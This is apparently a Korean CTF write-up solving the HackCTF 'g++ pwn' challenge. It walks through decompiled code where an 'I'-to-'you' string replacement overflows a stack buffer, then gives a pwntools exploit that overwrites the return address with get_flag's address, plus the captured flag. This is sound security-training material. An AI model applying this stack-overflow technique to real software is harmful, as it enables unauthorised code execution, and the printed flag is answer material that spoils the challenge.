# g++ pwn

```c
kimdong@ubuntu  ~/Wargame/200~250  file gpwn
gpwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped

kimdong@ubuntu  ~/Wargame/200~250  checksec gpwn
[*] '/home/kimdong/Wargame/200~250/gpwn'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
```
이번 바이너리는 32-bit로 mitigation은 하나도 걸려있지 않다.<br>

```c
kimdong@ubuntu  ~/Wargame/200~250  ./gpwn
Tell me something about yourself: aaaaaaaaaaaaaaaaaaaaaa
So, aaaaaaaaaaaaaaaaaaaaaa

```
실행을 시키면, 문자열과 함께 사용자의 입력값을 받고, 사용자의 입력값을 다시 출력해준다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vuln();
  return 0;
}
```
main문은 간단하고 vuln()함수를 보도록 하자.<br>

```c
int vuln()
{
  const char *v0; // eax
  char s; // [esp+1Ch] [ebp-3Ch]
  char v3; // [esp+3Ch] [ebp-1Ch]
  char v4; // [esp+40h] [ebp-18h]
  char v5; // [esp+47h] [ebp-11h]
  char v6; // [esp+48h] [ebp-10h]
  char v7; // [esp+4Fh] [ebp-9h]

  printf("Tell me something about yourself: ");
  fgets(&s, 32, edata);
  std::string::operator=(&input, &s);
  std::allocator<char>::allocator(&v5);
  std::string::string(&v4, "you", &v5);
  std::allocator<char>::allocator(&v7);
  std::string::string(&v6, "I", &v7);
  replace((std::string *)&v3);
  std::string::operator=(&input, &v3, &v6, &v4);
  std::string::~string(&v3);
  std::string::~string(&v6);
  std::allocator<char>::~allocator(&v7);
  std::string::~string(&v4);
  std::allocator<char>::~allocator(&v5);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(&s, v0);
  return printf("So, %s\n", &s);
}
```
vlun함수는 fgets(),replace(), strcpy()와 같은 함수를 사용한다.<br>
fgets()는 버퍼의 크기가 60인데 32Byte만 받기때문에, BOF는 불가해 보인다.<br>
replace()의 경우는, 문자열 `I`를 `you`로 치환하기 때문에, 64Byte까지 증가시킬수 있을것같다.<br>
`I`에서 `you`로 치환될수 2Byte가 증가하므로, I를 21개 입력해주고, 더미를 1 Byte추가해준면 총 64Byte를 덮고, ret에 넣어줄 주소를 찾으면 문제해결이 가능하다.<br>

```c
int get_flag()
{
  return system("cat flag.txt");
}
```
ida로  함수를 분석한 결과, `get_flag`라는 flag를 보여주는 함수가 있었다.<br>
ret의 주소를 이 함수로 바꿔주면 문제를 해결가능할 것으로 보인다.<br>
이 함수의 주소는 `0x08048f0d`이다.<br>

---

## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz",3011)

get_flag_address = 0x08048f0d
payload = "I"*21
payload += "A"
payload += p32(get_flag_address)
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame/200~250  python gpwn_ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3011: Done
[*] Switching to interactive mode
HackCTF{It's_e4si3r_th4n_y0u_th1nk!}
[*] Got EOF while reading in interactive
$ ls
$  
```

## END !
